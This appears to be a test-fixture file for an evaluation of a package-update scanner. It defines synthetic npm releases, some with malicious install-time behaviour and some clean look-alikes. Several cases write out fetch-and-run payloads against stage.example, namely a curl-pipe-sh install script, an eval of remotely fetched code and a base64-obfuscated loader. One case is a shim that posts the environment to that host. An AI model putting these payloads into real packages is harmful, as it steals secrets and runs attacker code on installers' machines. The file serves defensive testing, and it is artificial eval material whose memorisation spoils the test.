// Install-path cases: what runs when a package manager installs the update (lifecycle scripts, dependency sources,
// bin shims), as opposed to code that runs only when the library is imported. Synthetic and written for this eval;
// hosts use the reserved .example domain. These are well-known shapes, not post-cutoff write-ups, so `disclosed`
// is early and they report as "earlier attacks". Never use these to tune prompts.
import type { FileMap } from "../../src/prepass.ts";
import type { Case, Pkg } from "../2026-10-28-function-color-postinstall-hidden-download/cases.ts";

const enc = (s: string) => new TextEncoder().encode(s);
const files = (o: Record<string, string>): FileMap => new Map(Object.entries(o).map(([k, v]) => [k, enc(v)]));
const pkg = (o: Record<string, unknown>) => JSON.stringify(o, null, 2) + "\n";
const lib = (name: string, version: string, manifest: Record<string, unknown>, rest: Record<string, string>): Pkg =>
  ({ name, version, files: files({ "package.json": pkg({ name, version, main: "index.js", ...manifest }), ...rest }) });

export interface InstallCase extends Case { disclosed: string }

const IDX = `module.exports = (s) => String(s).trim();\n`;
const FETCH_RUN = `const https = require("https");\nconst { spawn } = require("child_process");\nconst fs = require("fs");\nconst dest = require("os").tmpdir() + "/.helper.js";\nhttps.get("https://stage.example/h.js", (r) => { r.pipe(fs.createWriteStream(dest)).on("close", () => spawn(process.execPath, [dest], { detached: true, stdio: "ignore" }).unref()); });\n`;
const attack = (id: string, note: string, base: Pkg, head: Pkg): InstallCase =>
  ({ id, kind: "attack", expect: "hold", disclosed: "2025-01-01", note, base: [base], head: [head] });
const clean = (id: string, note: string, base: Pkg, head: Pkg): Case => ({ id, kind: "look-alike", note, base: [base], head: [head], expect: "land" });

export const INSTALL_ATTACKS: InstallCase[] = [
  attack("install-postinstall-added", "patch release adds a postinstall script that downloads a second stage and starts it detached",
    lib("trim-it", "2.1.0", {}, { "index.js": IDX }),
    lib("trim-it", "2.1.1", { scripts: { postinstall: "node setup.js" } }, { "index.js": IDX, "setup.js": FETCH_RUN })),
  attack("install-inline-shell-pipe", "the new install script is an inline shell pipe from a remote host, no script file to read",
    lib("trim-it", "2.1.0", {}, { "index.js": IDX }),
    lib("trim-it", "2.1.1", { scripts: { install: "curl -s https://stage.example/i.sh | sh" } }, { "index.js": IDX })),
  attack("install-prepare-inline-eval", "a prepare script (runs for git and tarball installs) evaluates code fetched at install time",
    lib("trim-it", "2.1.0", {}, { "index.js": IDX }),
    lib("trim-it", "2.1.1", { scripts: { prepare: "node -e \"require('https').get('https://stage.example/p.js',r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d))})\"" } }, { "index.js": IDX })),
  attack("install-encoded-postinstall", "postinstall runs a file whose body is a base64 string decoded and evaluated",
    lib("trim-it", "2.1.0", {}, { "index.js": IDX }),
    lib("trim-it", "2.1.1", { scripts: { postinstall: "node init.js" } }, { "index.js": IDX, "init.js": `eval(Buffer.from("cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgaHR0cHM6Ly9zdGFnZS5leGFtcGxlL3ggfCBzaCcp", "base64").toString());\n` })),
  attack("install-dependency-git-url", "a registry dependency is replaced by a git URL on an unfamiliar account, so install pulls and may build unreviewed code",
    lib("route-it", "3.0.0", { dependencies: { "path-match": "^1.2.0" } }, { "index.js": `module.exports = require("path-match");\n` }),
    lib("route-it", "3.0.1", { dependencies: { "path-match": "github:fork-owner-example/path-match#main" } }, { "index.js": `module.exports = require("path-match");\n` })),
  attack("install-optional-tarball-url", "a new optionalDependency points at a plain-http tarball URL; a failed install is silent",
    lib("route-it", "3.0.0", {}, { "index.js": IDX }),
    lib("route-it", "3.0.1", { optionalDependencies: { "fast-path": "http://stage.example/fast-path-1.0.0.tgz" } }, { "index.js": IDX })),
  attack("install-bin-shadows-command", "a new bin entry is named like a common system command and reads the environment on use",
    lib("trim-it", "2.1.0", {}, { "index.js": IDX }),
    lib("trim-it", "2.1.1", { bin: { git: "shim.js" } }, { "index.js": IDX, "shim.js": `#!/usr/bin/env node\nrequire("https").request("https://stage.example/c", { method: "POST" }).end(JSON.stringify(process.env));\nrequire("child_process").spawnSync("/usr/bin/git", process.argv.slice(2), { stdio: "inherit" });\n` })),
];

export const INSTALL_CLEAN: Case[] = [
  clean("clean-prepare-tsc", "prepare script compiles TypeScript for a git install, no network",
    lib("typed-box", "1.0.0", { scripts: { test: "node test.js" } }, { "index.js": IDX }),
    lib("typed-box", "1.0.1", { scripts: { test: "node test.js", prepare: "tsc -p ." }, devDependencies: { typescript: "^5.6.0" } }, { "index.js": IDX })),
  clean("clean-postinstall-node-gyp-build", "native addon switches to the common prebuild loader: install runs node-gyp-build",
    lib("fast-hash", "2.0.0", { gypfile: true, scripts: { install: "node-gyp rebuild" } }, { "index.js": IDX, "binding.gyp": `{ "targets": [{ "target_name": "h", "sources": ["h.cc"] }] }\n`, "h.cc": `int h(int x) { return x * 31; }\n` }),
    lib("fast-hash", "2.1.0", { gypfile: true, scripts: { install: "node-gyp-build" }, dependencies: { "node-gyp-build": "^4.8.0" } }, { "index.js": IDX, "binding.gyp": `{ "targets": [{ "target_name": "h", "sources": ["h.cc"] }] }\n`, "h.cc": `int h(int x) { return x * 37; }\n` })),
  clean("clean-optional-platform-packages", "native package moves its binaries into per-platform optionalDependencies from the same scope, version-pinned",
    lib("img-resize", "0.8.0", {}, { "index.js": IDX }),
    lib("img-resize", "0.9.0", { optionalDependencies: { "@img-resize/linux-x64": "0.9.0", "@img-resize/darwin-arm64": "0.9.0" } }, { "index.js": `try { module.exports = require(\`@img-resize/\${process.platform}-\${process.arch}\`); } catch { module.exports = (s) => s; }\n` })),
];
